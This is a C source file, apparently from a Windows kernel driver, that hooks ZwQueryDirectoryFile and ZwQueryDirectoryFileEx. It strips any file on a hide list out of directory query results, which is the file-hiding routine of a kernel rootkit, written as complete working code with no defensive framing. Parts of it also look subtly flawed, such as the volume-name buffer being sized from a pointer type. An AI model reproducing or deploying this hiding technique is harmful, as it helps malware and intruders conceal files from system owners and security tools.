#include "hooks.h"

/* Support functions. */
/// <summary>
/// Gets a file name from FileInformation and puts it in the 'name' param pointer.
/// </summary>
/// <param name="FileInformationClass">FileInformationClass Object</param>
/// <param name="FileInformation">FileInformation Object</param>
/// <param name="name">Pointer to WCHAR variable to hold the filename.</param>
/// <param name="nameLength">Pointer to ULONG variable to hold the length in characters of the filename.</param>
void GetFileName(FILE_INFORMATION_CLASS FileInformationClass, PVOID FileInformation, PWCHAR name)
{
	// Initialize variables
	PWCHAR fileName = NULL;
	ULONG fileNameLength = 0;

	// Checks the object type of FileInformation and puts the FileName and FileNameLength variables from its struct into the variables initialized above
	switch (FileInformationClass)
	{
	case FileBothDirectoryInformation:
	{
		PFILE_BOTH_DIR_INFORMATION data = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		fileName = data->FileName;
		fileNameLength = data->FileNameLength;
	}
	break;

	case FileDirectoryInformation:
	{
		PFILE_DIRECTORY_INFORMATION data = (PFILE_DIRECTORY_INFORMATION)FileInformation;
		fileName = data->FileName;
		fileNameLength = data->FileNameLength;
	}
	break;

	case FileFullDirectoryInformation:
	{
		PFILE_FULL_DIR_INFORMATION data = (PFILE_FULL_DIR_INFORMATION)FileInformation;
		fileName = data->FileName;
		fileNameLength = data->FileNameLength;
	}
	break;

	case FileIdBothDirectoryInformation:
	{
		PFILE_ID_BOTH_DIR_INFORMATION data = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
		fileName = data->FileName;
		fileNameLength = data->FileNameLength;
	}
	break;

	case FileIdFullDirectoryInformation:
	{
		PFILE_ID_FULL_DIR_INFORMATION data = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation;
		fileName = data->FileName;
		fileNameLength = data->FileNameLength;
	}
	break;

	case FileNamesInformation:
	{
		PFILE_NAMES_INFORMATION data = (PFILE_NAMES_INFORMATION)FileInformation;
		fileName = data->FileName;
		fileNameLength = data->FileNameLength;
	}
	break;
	}

	// Checks if the item has a valid file-name
	if (fileName && fileNameLength > 0)
	{
		wmemcpy(name, fileName, fileNameLength / sizeof(WCHAR)); // Copies the file name into the name pointer.
		ForceNullTerminationWide(name, fileNameLength / sizeof(WCHAR));
	}
}

/// <summary>
/// Gets a folder directory name from a File Handle and puts it in the 'currentPath' param pointer.
/// Note: The drive letter is excluded (e.g. `C:\Users\Joe` -> `\Users\Joe`).
/// </summary>
/// <param name="FileHandle">The file handle to extract the folder path from.</param>
/// <param name="currentPath">Pointer to WCHAR variable to hold the directory name.</param>
void GetDirectory(HANDLE FileHandle, PWCHAR directory)
{
	// Initializing variables.
	IO_STATUS_BLOCK queryIoStatusBlock;
	PFILE_NAME_INFORMATION queryFileNameInformation; // Holds the folder path name & folder path name length.
	SIZE_T allocSize = sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR);
	ULONG tag = 'pDir'; // Random tag name for ExAllocatePool2.
	NTSTATUS queryStatus;

	queryFileNameInformation = (PFILE_NAME_INFORMATION)ExAllocatePool2(POOL_FLAG_NON_PAGED, allocSize, tag); // Driver equivalent of malloc - Used to allocate memory for the FILE_NAME_INFORMATION struct
	if (queryFileNameInformation != NULL)
	{
		RtlZeroMemory(queryFileNameInformation, allocSize); // Zero initialization for queryFileNameInformation
		queryStatus = ZwQueryInformationFile(FileHandle, &queryIoStatusBlock, queryFileNameInformation, allocSize, FileNameInformation); // Calling ZwQueryInformationFile to recieve the FileNameInformation from the handle.

		// Checks if the response is valid & if ZwQueryInformationFile was executed successfully.
		if (NT_SUCCESS(queryStatus) && queryFileNameInformation->FileName && queryFileNameInformation->FileNameLength > 0)
		{
			wmemcpy(directory, queryFileNameInformation->FileName, queryFileNameInformation->FileNameLength / sizeof(WCHAR)); // Copies the file name into the name pointer.
			ForceNullTerminationWide(directory, queryFileNameInformation->FileNameLength / sizeof(WCHAR));
		}

		ExFreePoolWithTag(queryFileNameInformation, tag); // Free the memory allocated above for the FILE_NAME_INFORMATION struct.
	}
}

/// <summary>
/// Gets a device name from a File Handle and puts it in the 'currentVolume' param pointer.
/// Device name example: \Device\HarddiskVolume2
/// </summary>
/// <param name="FileHandle">The file handle to extract the folder path from.</param>
/// <param name="currentVolume">Pointer to WCHAR variable to hold the volume name.</param>
void GetVolume(HANDLE FileHandle, PWCHAR volume)
{
	// Initializing variables.
	IO_STATUS_BLOCK queryIoStatusBlock;
	PFILE_VOLUME_NAME_INFORMATION queryVolumeFileNameInformation; // Holds the device
	SIZE_T allocSize = sizeof(PFILE_VOLUME_NAME_INFORMATION) + MAX_PATH;
	ULONG tag = 'pVol'; // Random tag name for ExAllocatePool2.
	NTSTATUS queryStatus;

	queryVolumeFileNameInformation = (PFILE_VOLUME_NAME_INFORMATION)ExAllocatePool2(POOL_FLAG_NON_PAGED, allocSize, tag); // Driver equivalent of malloc - Used to allocate memory for the FILE_VOLUME_NAME_INFORMATION struct
	if (queryVolumeFileNameInformation != NULL)
	{
		RtlZeroMemory(queryVolumeFileNameInformation, allocSize); // Zero initialization for queryFileNameInformation
		queryStatus = ZwQueryInformationFile(FileHandle, &queryIoStatusBlock, queryVolumeFileNameInformation, allocSize, FileVolumeNameInformation); // Calling ZwQueryInformationFile to recieve the FileNameInformation from the handle.

		// Checks if the response is valid & if ZwQueryInformationFile was executed successfully.
		if (NT_SUCCESS(queryStatus) && queryVolumeFileNameInformation->DeviceName && queryVolumeFileNameInformation->DeviceNameLength > 0)
		{
			wmemcpy(volume, queryVolumeFileNameInformation->DeviceName, queryVolumeFileNameInformation->DeviceNameLength / sizeof(WCHAR)); // Copies the file name into the name pointer.
			ForceNullTerminationWide(volume, queryVolumeFileNameInformation->DeviceNameLength / sizeof(WCHAR));
		}

		ExFreePoolWithTag(queryVolumeFileNameInformation, tag); // Free the memory allocated above for the FILE_VOLUME_NAME_INFORMATION struct.
	}
}

/// <summary>
/// Fills the path with the volume name and the directory name.
/// e.g. `\Device\HarddiskVolume2\Users\Folder\`
/// </summary>
/// <param name="FileHandle">FileHandle that contains the path information.</param>
/// <param name="path">Pointer to WCHAR list that holds the path value.</param>
void GetPath(HANDLE FileHandle, PWCHAR path)
{
	GetVolume(FileHandle, path);
	GetDirectory(FileHandle, &path[wcslen(path)]);
	wmemcpy(&path[wcslen(path)], L"\\\0", 2); // Appends `\` + terminating null byte to the path
}

/// <summary>
/// Checks if a file should be hidden.
/// </summary>
/// <param name="path">Full path of the file.</param>
/// <param name="name">Name of the file.</param>
/// <param name="nameLength">Length of the name of the file.</param>
/// <returns>True if the file needs to be hidden. Otherwise False.</returns>
BOOLEAN CheckHideFile(PWCHAR path, PWCHAR name)
{
	// Initializing variables.
	path_t pathObj;

	// Concatenates the path and the file name.
	wcscpy(pathObj.path, path);
	wcscat(pathObj.path, name);
	pathObj.length = wcslen(pathObj.path);
	ForceNullTerminationWide(pathObj.path, pathObj.length);

	// Check if the path is inside the hide list. If it is, return True.
	if (FindInArray(&hidePathsArr, pathObj) != -1)
		return TRUE;

	return FALSE;
}

/// <summary>
/// Iterates over the queried files and hides them accordingly.
/// </summary>
NTSTATUS FilteringProccess(NTSTATUS status, HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, FILE_INFORMATION_CLASS FileInformationClass, ULONG Length)
{
	// Checks if the original query failed. If it does, return the fail status.
	if (!NT_SUCCESS(status))
		return status;

	// Check if the original query returned any data. If it doesn't, return the status code.
	if (IoStatusBlock->Information <= 0)
		return status;

	// Filter only if the information need to be filtered. If it doesn't need filtering, return the status code.
	if (!(FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileNamesInformation))
		return status;

	// Start the filtering process.
	PGENERAL_INFORMATION current = (PGENERAL_INFORMATION)FileInformation; // A pointer to a buffer that holds the desired information about the file.
	PGENERAL_INFORMATION previous = NULL;
	ULONG nextEntryOffset;
	WCHAR currentName[MAX_PATH] = { 0 };
	WCHAR currentPath[MAX_PATH] = { 0 };
	GetPath(FileHandle, currentPath);
	do
	{
		nextEntryOffset = current->NextEntryOffset; // Gets the next offset in the linked list.
		GetFileName(FileInformationClass, current, currentName); // Gets the current file name from the current FileInformation object.
		if (CheckHideFile(currentPath, currentName))
		{
			DbgPrintEx(0, 0, "Hiding file: %S%S", currentPath, currentName);
			if (nextEntryOffset) // If not last block
			{
				memmove(current, (PUCHAR)current + nextEntryOffset, (ULONG)(Length - ((ULONGLONG)current - (ULONGLONG)FileInformation) - nextEntryOffset)); // Cuts off current item from the linked list by replacing it with the next item in the linked list.
				IoStatusBlock->Information -= nextEntryOffset;
				continue;
			}
			else
			{
				if (current != FileInformation)
				{
					previous->NextEntryOffset = 0; // Cuts off current item from the linked list by ending the linked list at the previous item.
					IoStatusBlock->Information -= nextEntryOffset;
				}
				else
					status = STATUS_NO_MORE_FILES;

				break;
			}
		}

		// Moves to the next item in the files linked list as pointed by the FileInformation object.
		previous = current;
		current = (PGENERAL_INFORMATION)((PUCHAR)current + nextEntryOffset);

	} while (nextEntryOffset);

	return status;
}


NTSTATUS HookZwQueryDirectoryFile(IN HANDLE FileHandle, IN HANDLE Event, IN PIO_APC_ROUTINE ApcRoutine, IN PVOID ApcContext, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass, IN BOOLEAN ReturnSingleEntry, IN PUNICODE_STRING FileName, IN BOOLEAN RestartScan)
{
	NTSTATUS status = oldZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan); // Calls original Nt* function.
	status = FilteringProccess(status, FileHandle, IoStatusBlock, FileInformation, FileInformationClass, Length);
	return status;
}

NTSTATUS HookZwQueryDirectoryFileEx(IN HANDLE FileHandle, IN HANDLE Event, IN PIO_APC_ROUTINE ApcRoutine, IN PVOID ApcContext, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass, IN ULONG QueryFlags, IN PUNICODE_STRING FileName)
{
	NTSTATUS status = oldZwQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName); // Calls original Nt* function. // Calls original Nt* function.
	status = FilteringProccess(status, FileHandle, IoStatusBlock, FileInformation, FileInformationClass, Length);
	return status;
}